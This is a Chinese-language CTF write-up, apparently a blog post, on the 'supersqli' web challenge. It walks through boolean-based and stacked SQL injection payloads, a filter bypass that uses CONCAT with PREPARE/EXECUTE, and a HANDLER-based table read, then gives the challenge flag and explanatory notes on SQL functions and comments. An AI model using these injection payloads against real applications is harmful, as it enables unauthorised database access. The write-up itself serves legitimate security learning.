---
layout: post
title: Web进阶题-supersqli
excerpt: "攻防世界进阶Web题目-supersqli"
date:   2020-10-13 22:09:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问网站，网页内容为一个输入框和一个提交按钮

2. 提交*1*时，点击按钮，网页返回内容为：

   ```php
   array(2) {
     [0]=>
     string(1) "1"
     [1]=>
     string(7) "hahahah"
   }
   ```

3. 探测注入点

   * 提交*1 and 1=2*，返回内容为空
   * 提交*1 and 1=1*，返回内容同第二步，正常返回
   * 所以此处存在SQL注入点

4. 提交*1' union select \**，返回内容为"return preg_match("/select\|update\|delete\|drop\|insert\|where\|\./i",$inject);"，所以正则表达式是大小写不敏感的，因此大小写无法绕过

5. 尝试Boolean-based注入爆破数据库信息：

   * *1' and ORD(MID(DATABASE(),1,1))>'200*，使用这个可以当and后的语句为false值不一样时返回空
   * 使用Burp Suite进行爆破数据库名，*1' and ORD(MID(DATABASE(),x,1))=y*，通过编写的python脚本，爆破出数据库名为supersqli
   * 使用Burp Suite进行爆破数据库名，*1' and ORD(MID(USER(),x,1))=y*，爆破用户名为root@localhost

6. 尝试堆叠注入，成功执行。之后尝试show命令，发现一个flag在ctftraining数据库下的FLAG_TABLE表的FLAG_COLUMN字段中，该字段备注为not_flag。

   * *1'；show tables;'*，返回内容如下，所以当前数据库下有两张表，分别是191981093111451和words。

     ```php
     array(1) {
       [0]=>
       string(16) "1919810931114514"
     }
     
     array(1) {
       [0]=>
       string(5) "words"
     }
     ```

   * *1’;show columns from 1919810931114514;'*，返回内容为空

   * *1';show databases;'*,返回内容如下，发现有一个名为ctftraining的数据库

     ```php
     array(1) {
       [0]=>
       string(11) "ctftraining"
     }
     
     array(1) {
       [0]=>
       string(18) "information_schema"
     }
     
     array(1) {
       [0]=>
       string(5) "mysql"
     }
     
     array(1) {
       [0]=>
       string(18) "performance_schema"
     }
     
     array(1) {
       [0]=>
       string(9) "supersqli"
     }
     
     array(1) {
       [0]=>
       string(4) "test"
     }
     ```

   * *1';show tables from ctftraining;'*，返回内容如下

     ```php
     array(1) {
       [0]=>
       string(10) "FLAG_TABLE"
     }
     
     array(1) {
       [0]=>
       string(4) "news"
     }
     
     array(1) {
       [0]=>
       string(5) "users"
     }
     ```

   * *1';show columns from ctftraining.FLAG_TABLE;'*，访问失败，发现是因为正则屏蔽了"\."

   * *1';show columns from FLAG_TABLE from ctftraining;'*，返回内容如下

     ```php
     array(6) {
       [0]=>
       string(11) "FLAG_COLUMN"
       [1]=>
       string(12) "varchar(128)"
       [2]=>
       string(2) "NO"
       [3]=>
       string(0) ""
       [4]=>
       string(8) "not_flag"
       [5]=>
       string(0) ""
     }
     ```

7. 由于使用不了select，被卡住了

## 别人的解题方法

1. 使用payload：*1';show columns from \`1919810931114514\`;'*，网页返回内容

   ```php
   array(6) {
     [0]=>
     string(4) "flag"
     [1]=>
     string(12) "varchar(100)"
     [2]=>
     string(2) "NO"
     [3]=>
     string(0) ""
     [4]=>
     NULL
     [5]=>
     string(0) ""
   }
   ```

   > 我在这一步并没有返回数据，是因为没有给字串加反引号
   >
   > 当字串为数据库的保留字时，需要使用反引号加以标识，使它被当作普通字符串使用
   >
   > 1. 当执行某个命令多次没结果且无语法报错时，记得查看是否是保留字
   > 2. 养成在sql语句中使用反引号的习惯

2. 由于存在堆叠注入，所以可以使用mysql预处理语句，访问网页，网页返回内容为“strstr($inject, "set") && strstr($inject, "prepare")"

   ```sql
   1';
   use supersqli;
   set @sql=concat('s','elect `flag` from `1919810931114514`');
   prepare realsql from @sql;
   execute realsql;
   ```

3. 使用大小写绕过，*1';sEt @sql=concat('s','elect \`flag\` from \`1919810931114514\`');prepare realsql from @sql;exEcute realsql;#*，网页返回内容如下

   ```php
   array(1) {
     [0]=>
     string(38) "flag{c168d583ed0d4d7196967b28cbd0b5e9}"
   }
   ```

4. 发现flag，flag{c168d583ed0d4d7196967b28cbd0b5e9}

## 独立思考

### 1. SQL注入有哪些常用的函数？

| 函数名 | 参数                        | 作用                                   |
| ------ | --------------------------- | -------------------------------------- |
| MID    | 字段名，开始位置，长度      | 从指定字段中提取字段的内容             |
| LIMIT  | 起始条号，条数              | 限制读取返回结果中从m条开始的n条数据   |
| CONCAT | str1,str2,str3,.......,strn | 连接一或多个字符串                     |
| COUNT  | 列名                        | 返回指定列的条数，NULL不计入在内       |
| RAND   |                             | 产生0~1的随机数                        |
| FLOOR  |                             | 向下取整                               |
| SUBSTR | str,start,length            | 截取字符串                             |
| ASCII  |                             | 返回字符串的ASCII码                    |
| LEFT   | str,length                  | 返回字符串从左开始的length长度的字符串 |
| ORD    | str                         | 返回第一个字符的ASCII码                |

SELECT用于从表中查数据，如果没有select无法查表内数据的，所以如果数据在表内，是一定可以找到办法绕过对select的过滤。

### 2. SQL预编译语句有什么用法？

简单情况下，SQL交互流程如下

1. 后端代码从请求中提取参数，拼接好SQL语句
2. 后端发送整个SQL语句给数据库处理
3. 数据库解析SQL语句、检查语法和语义
4. 数据库编译SQL语句生成代码
5. 执行数据库操作
6. 返回数据给后端程序

而预编译语句情况下，SQL交互流程如下

1. 后端代码把待编译的SQL语句准备好，每个变量用一个*?*代替，发送给数据库程序
2. 数据库对这条语句进行解析、检查、编译
3. 后端代码从请求中取出参数，依次setString到原语句对应位置，发送给数据库程序
4. 数据库程序只会把新传来的参数作为字符串处理，而不会作为SQL语句执行，因为SQL已经是预编译好的了。数据库程序根据传来的参数，进行数据库操作
5. 返回数据给后端程序

**预编译语句的作用**

1. 提高SQL查询速度
2. 避免SQL注入，提高安全性

**预编译语句格式**

```sql
 PREPARE statement_name FROM preparable_string
```

**例**

```sql
prepare ins from 'select `username` from user where id=?'
```

**在本题中的应用**

* 本题采用了正则表达式的大小写不敏感方式过滤参数字符串中的内容，所以大小写绕过就无法实现
* 由于本题存在堆叠注入漏洞，所以可以将select分拆为两部分使用CONCAT进行拼接
* 如果没有堆叠漏洞本方法就不能实现，因为需要CONCAT的结果作为SQL命令，而CONCAT的返回值是字符串，所以只能先用CONCAT拼接字符串，set赋值给一个变量
* 预编译SQL恰好可以从字符串中编译SQL命令，从而将CONCAT的结果加以利用
* 最后使用execute执行命令

### 3. SQL语句的注释有哪些？

不同数据库采用的注释符**可能不一样**。

一般有以下几种：

* \-\- ，注意\-\- 是三个字符，前两个是横线，第三个是空格，如果没有空格，会出现语法错误
* #，单行注释，后面不需要空格，平时可以使用这个注释，不容易忘记空格
* /\*\*/，多行注释，可以用来绕过关键字过滤(根据情况而定)

### 4. 通过handler如何查询表中的数据？

MySQL除了使用select查询表中的数据，也可以使用handler语句。

* select语句一次返回所有记录
* handler语句每次仅返回一条记录

handler语句提供通往表的直接通道的存储引擎接口

| 语句                                         | 作用                                     |
| -------------------------------------------- | ---------------------------------------- |
| handler *\[table_name\]* OPEN                | 打开一张表，声明一个名为table_name的句柄 |
| handler *\[table_name\]* READ \{first/next\} | 读取第一行、读取下一行                   |
| handler *\[table_name\]* CLOSE               | 关闭句柄                                 |

所以本题中可以不使用预编译语句，仅使用handler就可找到答案(语句中的as p作为一个别名)

```sql
1';handler `1919810931114514` open as p;handler p read first;#
```

### 5. 本题有什么收获？

1. SQL的单行注释使用两个横线后需要有空格才会生效
2. show命令也很强大，除了无法接触到表内的内容
3. select命令被过滤对SQL注入有很大的限制
4. 堆叠注入虽然很好用，但是不常用，绝大多数情况下是不允许一次执行多条SQL语句的。
   * PHP中*mysqli_multi_query()*支持多条SQL语句同时执行
   * 实际情况中，往往使用*mysqli_query()*来查询数据库，这个方法只能执行一条语句，分号之后的内容不会被执行
5. 当存在堆叠注入且能使用prepara和execute时，可以使用预编译语句绕过大多数正则表达式
6. strstr是大小写敏感的，可以使用大小写绕过
7. 正则表达式使用i控制符之后，是大小写不敏感的，此时大小写绕过将失效


## 产生过的疑问

1. SQL注入有哪些常用的函数？
2. SQL预编译语句有什么用法？
3. SQL语句的注释有哪些？
4. 通过handler如何查询表中的数据？
5. 本题有哪些收获？

